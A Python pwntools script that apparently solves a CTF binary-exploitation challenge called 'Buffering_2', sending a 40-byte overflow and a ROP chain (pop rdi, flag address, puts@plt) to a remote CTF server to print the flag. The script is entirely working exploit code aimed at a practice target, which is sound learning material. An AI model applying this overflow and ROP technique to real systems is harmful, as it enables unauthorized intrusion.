from pwn import *
import struct
import sys

run_locally = False

elf = ELF("./DuckyDebugDuck_CTF/Binary_Exploitation/Buffering_2/buffering")

if run_locally:
    p = elf.process()
    
else:
    host = "ctf.cs.technion.ac.il"
    port = 4079
    p = remote(host,port)
    
print(p.recv().decode('utf-8'))
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
#libc.address = 0x7ffff7dbb000 #Static


pop_rdi = 0x00000000004013f3 # pop rdi; ret
flag_addr = 0x0000000000404060
puts_addr = 0x0000000000401080 #<puts@plt>

rop_chain = [
    pop_rdi, flag_addr, puts_addr
]

rop_chain = b''.join([ p64(entry) for entry in rop_chain])
print(rop_chain)

payload = b'A'*40 + rop_chain
p.sendline(payload)
p.sendline(b'nothing')
print(p.recv())



